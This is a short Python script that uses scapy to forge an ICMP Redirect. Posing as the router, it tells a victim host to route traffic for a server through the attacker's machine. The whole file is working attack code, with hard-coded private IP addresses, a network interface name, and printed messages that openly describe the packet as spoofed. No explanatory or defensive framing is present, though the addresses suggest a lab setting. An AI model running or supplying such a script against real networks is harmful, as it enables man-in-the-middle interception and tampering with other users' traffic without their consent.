

#!/usr/bin/env python3
from scapy.all import IP, ICMP, send

victim_ip   = "10.218.8.108"   
router_ip   = "10.218.8.224"   
attacker_ip = "10.218.8.48"    
server_ip   = "10.218.8.170"   
original_packet = IP(src=victim_ip, dst=server_ip) / ICMP(type=8, code=0)

redirect_packet = IP(src=router_ip, dst=victim_ip) / \
                   ICMP(type=5, code=1, gw=attacker_ip) / \
                   bytes(original_packet)[:28]

print(f"[*] Sending forged ICMP Redirect to {victim_ip}")
print(f"    Claiming to be from: {router_ip} (spoofed)")
print(f"    New gateway suggested: {attacker_ip}")
send(redirect_packet, iface="wlp2s0", verbose=1)
print("[*] Done.")
